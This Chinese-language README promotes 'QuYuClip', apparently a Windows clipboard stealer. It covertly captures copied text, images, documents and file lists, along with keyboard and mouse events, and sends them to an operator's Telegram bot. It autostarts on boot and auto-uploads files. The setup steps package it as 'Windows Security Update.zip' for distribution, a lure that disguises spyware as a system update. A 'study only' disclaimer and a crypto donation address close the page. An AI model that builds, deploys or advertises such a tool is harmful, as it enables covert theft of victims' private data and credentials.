# 🚀 趋于Windows剪贴板监控工具 (QuYuClip)

一款功能强大的Windows剪贴板监控工具，支持多种格式内容监控和远程通知功能。 🔥

## 🛠️ 部署说明

### 💻 系统要求
- 🪟 Windows 7/8/10/11 操作系统
- 🐍 Python 3.8或更高版本
- 🌐 网络连接

### 📦 依赖安装
```bash
pip install win32clipboard keyboard mouse pillow requests
```

### ⚙️ 配置说明
1. 🤖 获取Telegram Bot Token
   - 访问 @BotFather 创建新的bot
   - 保存获取到的token

2. 🆔 获取目标Chat ID
   - 将bot添加到目标频道/群组
   - 获取频道/群组的chat_id

3. 🔧 修改配置信息
   - 打开`clipboard_monitor.py`
   - 修改`bot_token`和`chat_id`为你的值

## 🎯 使用说明

### 🚀 启动方式
1. 运行打包工具
```bash
双击运行 start.bat
```

2. 打包完成后
- ✨ 将自动生成 Windows Security Update.zip 压缩包
- 📦 该压缩包包含所有运行所需文件
- 🚀 可直接分发使用

⚡ 注意：打包过程可能需要几分钟时间，请耐心等待完成。

### 🎮 监控功能
- 📝 复制操作 (Ctrl+C)
- 📋 粘贴操作 (Ctrl+V)
- ✂️ 剪切操作 (Ctrl+X)
- 📚 历史剪贴板 (Win+V)

### 📂 支持格式
- ✍️ 文本内容
  - 📝 Unicode文本
  - ✂️ 自动截断超过3000字符的内容
  - 🌍 支持所有语言字符

- 📷 图片文件
  - 🖼️ PNG, JPG, JPEG, GIF, BMP格式
  - 📸 支持直接复制的图片
  - 🗂️ 支持从文件管理器复制的图片

- 📹 视频文件
  - 🎥 MP4, AVI, MOV, WMV, FLV格式
  - 📁 支持从文件管理器复制

- 📄 文档文件
  - 📝 TXT, DOC, DOCX, PDF文件
  - 📊 XLS, XLSX表格文件
  - 📽️ PPT, PPTX演示文件
  - ⚡ 自动处理单个文件

- 📁 多文件列表
  - 📚 支持同时复制多个文件
  - 📋 自动显示前5个文件名
  - 📊 显示总文件数量
  - 🚀 自动上传前3个文件

### 📨 消息通知
- ⚡ 实时推送到Telegram
- 🔄 自动重试机制
- 💾 离线消息缓存
- 🎯 多种格式支持

## 📝 更新日志
### ✨ v1.0.0 (2025-02-24)
#### 🌟 首次发布
- 🎯 基础剪贴板监控
- 📱 Telegram消息推送
- 📂 多格式内容支持
- 🚀 开机自启动功能
- 🔄 自动重试机制
- 🔍 文件格式检测
- ⚡ 大文件处理优化
- 📚 历史剪贴板监控
- 📦 多文件批量上传支持
- 🎯 消息队列管理系统
- 💾 断网消息本地缓存

## 🛠️ 技术特点
- 🔍 Windows API剪贴板监控
- ⌨️ 键盘鼠标事件捕获
- 🔄 多线程消息队列处理
- 📂 支持多种文件格式
- 🚀 自动开机自启动
- 💾 断网消息本地缓存
- 🎯 智能内容过滤
- ⚡ 完整的错误重试机制

## 💫 联系方式与社群

### 🌟 Telegram 社群
- 📢 官方频道：[@QUYUkjpd](https://t.me/QUYUkjpd)
- 👥 交流群：[@QUYUkjq](https://t.me/QUYUkjq)
- 👨‍💻 作者：[@Lawofforce](https://t.me/Lawofforce)

🌈 欢迎加入我们的社群，获取最新更新和技术支持！

## 🎁 赞助支持

✨ 如果觉得这个程序对你有帮助，欢迎赞助支持！

### 💎 TRC20-USDT 钱包地址
```
TQ2gs6167orQSVWVNHWrKq9SZ8a5WRETZs
```
👆 点击上方复制按钮即可复制

<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TQ2gs6167orQSVWVNHWrKq9SZ8a5WRETZs" alt="TRC20-USDT 二维码" width="200"/>

🌟 您的支持是我们持续改进的动力！

## ⚠️ 免责声明
🔒 本工具仅供学习研究使用，请遵守相关法律法规，不得用于非法用途。使用本工具所产生的一切后果由使用者自行承担。
